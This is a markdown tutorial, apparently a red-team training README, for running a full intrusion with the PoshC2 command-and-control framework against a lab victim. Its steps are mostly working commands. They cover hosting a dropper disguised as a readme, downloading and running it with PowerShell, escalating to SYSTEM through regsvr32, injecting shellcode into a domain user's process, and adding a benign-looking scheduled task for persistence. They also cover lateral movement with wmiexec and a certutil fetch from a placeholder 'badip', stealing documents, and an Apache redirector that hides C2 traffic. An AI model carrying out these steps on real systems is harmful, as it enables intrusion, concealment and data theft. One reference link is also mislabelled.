# CTE-For-Monkeys

- Running Poshc2 
	- Set up
	- tool familiarization 
		- hosting payload
		- file upload 
		- host enumeration 
		- user escalation
		- persistence / scripting
		- later movement
        - file download
- living of the land ( windows )
	- file downloads 
	- file (payload) execution 
- powershell 
	- user enumeration 
	- domain enumeration 
	- scripting


# Running PoshC2

Create a new project:

```
posh-project -n <project-name>
```

Projects can be switched to or listed using this script:
```
[*] Usage: posh-project -n <new-project-name>
[*] Usage: posh-project -s <project-to-switch-to>
[*] Usage: posh-project -l (lists projects)
[*] Usage: posh-project -d <project-to-delete>
[*] Usage: posh-project -c (shows current project)
```
Edit the configuration for your project:
```
posh-config
```
Edit `payloadcoms` to your ip  
Also edit Bindport form 443 to 80

Launch the PoshC2 server:
```
posh-server
```

Alternatively start it as a service:
```
posh-service
```
Separately, run the ImplantHandler for interacting with implants:
```
posh -u <username>
```

For more on `Poshc2` github like [here](https://apple.stackexchange.com/questions/254380/why-am-i-getting-an-invalid-active-developer-path-when-attempting-to-use-git-a) 

# Host Payloads 

The PoshC2 Implant Types can be summarized as:
* PS - PowerShell Implant.
* C# - C# Implant that does not use System.Management.Automation.dll.
* PY - Python Implant.
* PB - PBind

In the ImplantHandler run file upload command 
```
add-hosted-file
```

Host file options 
```
file location > /var/poshc2/YourProjectName/payloads/Sharp_v4_dropper_x64.exe
file uri > /en-us/readme.md
file MIME type > text/html
Base64 > n
```

View all hosted files by running
```
show-hosted-files
```

# Download Payload on Victim 

For testing lets downloading using powershell on victim machine using a basic user
```powershell
iwr -uri http://<YouripOrDomian>/HostedUriString -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
```

Interact with implant by typeing `1` in ImplantHandler

# User Escalation

Check for running process 
```ps 
ps
```
> As a basic user you'll only be able to see anything ran under your own context. 

Lets escalate to system through execution  

Upload a the dll to the machine 
```ps
> upload-file 
> /var/poshc2/projetname/payloads/Sharp_v4_x64.dll
> location C:\windows\temp\updater.dll 
```

Execute dll using local windows binaries 
```ps
sharpps regserv32 C:\windows\temp\updater.dll
``` 
> For more on native window binaries look [here](https://lolbas-project.github.io/)

After execution you should see a system level beacon return in ImplantHandler  

Once you are system you can Enumerate for other users on the box with domain access. 
```ps
ps
```

Search for any user process being ran as a domain user, to inject into

```ps
inject-shellcode <PID> 
```
```ps
<name_of_shellcode.bin>
```

Checking your ImplantHandler you should see a new beacon running in the context of said user.

As a domain user you can now run domain level commands, you can check your groups and privileges 
``` 
sharpps net user <domain username>
```

# Persistence and Scripting 

Now to maintain our domain user privilege lets create a .ps1 script to set persistence using registry keys  

On your attack box with the editor of your choice copy the following 
```ps
$payloadpath = "C:\windows\temp\bad.exe"
$taskname = "Test Updater"
$tskdescription = "This task updates things."
$action = New-ScheduledTaskAction -Execute $payloadpath
$days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
$trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 8am
Register-ScheduledTask -Action $action -Trigger $trigger -Taskname $taskname -Description $tskdescription
```
> Learn more about powershell `New-ScheduledTaskTrigger` [here](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtask?view=windowsserver2022-ps)

Save your pslo script as bad.ps1 in /home/parrot/desktop/bad.ps1

Lets run the .ps1
```
pslo /home/parrot/desktop/bad.ps1
```

You should see your scheduled task name appear for confirmation 

# Lateral Movement 

Now lets run a `sharpview` to enumerate the network to conduct lateral movement
```
sharpview 
```
> Read more on sharpview [here](https://academy.hackthebox.com/course/preview/active-directory-powerview/powerviewsharpview-overview--usage)

We can us the enumeration script to identify the next workstation to laterally move to 

```
resolveip <127.0.0.1>
```

Lets host a new payload 
```
add-hosted-file
```

Host file opttions 

```
file location > /var/poshc2/projectname/payloads/Sharp_v4_dropper_x64.exe
file uri > /verify
file MIME type > text/html
Base64 > n
```

Run wimc to get download and execution of hosted payload
```
wmiexec <127.0.0.1> <domain> <username> password=asdsa "cmd /c certutil.exe -urlcache -split -f http://badip/verify C:\windows\downloads\bad2.exe && C:\windows\downloads\bad2.exe"
```

In ImplantHandler interact with the new payload 

Lets run a built in host enumeration script 
```
seatbelt
```
Take some time to look at the differnet feilds, look into any that you dont recognize.

In the new payload handler lets navigate to the `documents` folder 
```
cd C:\users\username\documents
```

lets see what documents we can find 
```
ls
```

Now lets download some files 
```
download-file <filename>
```

Congratulations you have ran through your first OPPLAN, check [here](poshC2_help_v8.md) for the help list for poshc2 and other commands you can run.

# Setting up proxy 

When running actions as an actor you always want to avoid giving away where you are coming from or your source ip. Typically this is done with a proxy also sometimes known as a LP (listening post), in this case it will be an ubuntu server running apache. Your current setup is as follows: 

	parrot-OS <> Victim VM

What we will be doing with the Ubuntu server is routing our C2 traffic through it so it appears it as though it is coming from the Ubuntu server and the the Parrot vm.

	Parrot <> Ubuntu <> Victim VM 

Lets install any Ubuntu server ISO from the interwebs [here](https://ubuntu.com/download/server).

# Configureing Apache on Ubuntu

Setting up your Ubuntu server should be fairly similar to how you set up your Parrot VM considering they are both linux based devices. 

Once your IPs are set and your Ubuntu server can route two both your Parrot and your Victim machine, lets set up apache.

```bash 
service apache status 
```

Depending on your setup apache/apache2 might be inactive(dead) by default. To start it we will run the following

```bash 
sudo service apache/apache2 start
```

You can verify by running the same status command 

```bash 
service apache status 
```
> **NOTE:** If you ever have issues starting your apache server to read the error codes. You could run into issues depending on the services you might already have running if they are using ports or services needed for apache.
  
Now if you open a browser of your choice in your Ubuntu server or attack box and browse to your Ubuntus IP you should be met with an apache2 default page describing how to configure your new apache server, read up because I dont want to retype all that. 

Apache configuring tree: 

	/etc/apache2/
	|-- apache2.conf
	|       `--  ports.conf
	|-- mods-enabled
	|       |-- *.load
	|       `-- *.conf
	|-- conf-enabled
	|       `-- *.conf
	|-- sites-enabled
	|       `-- *.conf

Now if you want to be a kool kid like Duck and change your web page to idk say a picture of a duck, we have to navigate to our web root at /var/www/html and change the content inside of our index.html file. We also have to get our duck.jpg file and drop it in are web root. 

```html
<!DOCTYPE html>
<html>
<body>

<h1>Its a Duck</h1>
<img src="duck.jpg" alt="W3Schools.com" width="104" height="142">

</body>
</html>
```

# Configure Proxy 

Now lets move to configuring our proxy for our C2 coms.

First we will navigate to /etc/apache2/site-enabled and view our `000-default.conf`, this is where we configure our setting for our currently hosted sites. Inside will looking something like this:

```apache 
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

What we want to add is an apache module called `mod_proxy`, we can do that with 2 new lines. 

```apache
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

	AllowOverride All
   	RewriteEngine On

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
Now that we have `mod_rewite` enabled we want to use the rewrite rules to create our filters. 

The first argument is a variable describing a characteristic of the request, the second argument is a regular expression that must match the variable, and a third optional argument is a list of flags that modify how the match is evaluated.

```html 
RewriteRule Pattern Substitution [flag]
```

Lets add our proxy rule to allow our C2 coms through our new proxy. 

```apache
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

	AllowOverride All
   	RewriteEngine On

	RewriteRule ^.*$ http://BADIPHERE%{REQUEST_URI} [P]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

With the above rules you should now have a proxy setup to push your C2 coms through the Ubuntu server. Keep in mind you now have to reconfigure your Poshc2 to have host coms be your Ubuntu server. You can get real fancy with mod_rewrite and add more rules/conditions to allow only C2 coms through and redirect anything else by filtering by your useragent string set in your poshc2 `config.yml` as well as your uri request for files being hosted, example code bellow as well as resources links on how to do fancy things below. 

```apache
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/(metro91/admin/1/ppptp.jpg|metro91/admin/1/secure.php)/?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 6\.0;\ Windows\ NT\ 5\.1;\ SV1;\ InfoPath\.2\)?$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteRule ^.*$ http://example.com/? [L,R=302]
```

# Random BS

Things to lookup and learn: 
- [ ] MIME types
- [ ] Windows 10 privilege escalation 
- [ ]   

# Resources 
- [PoshC2 Documentation](https://poshc2.readthedocs.io/_/downloads/en/latest/pdf/)
- [Mod_rewrite](https://httpd.apache.org/docs/2.4/rewrite/intro.html)
- [Mod_rewrite cheatsheet](https://mod-rewrite-cheatsheet.com/)
- [BlueScreenOfJeff Modrewrite walthrough for CS](https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/)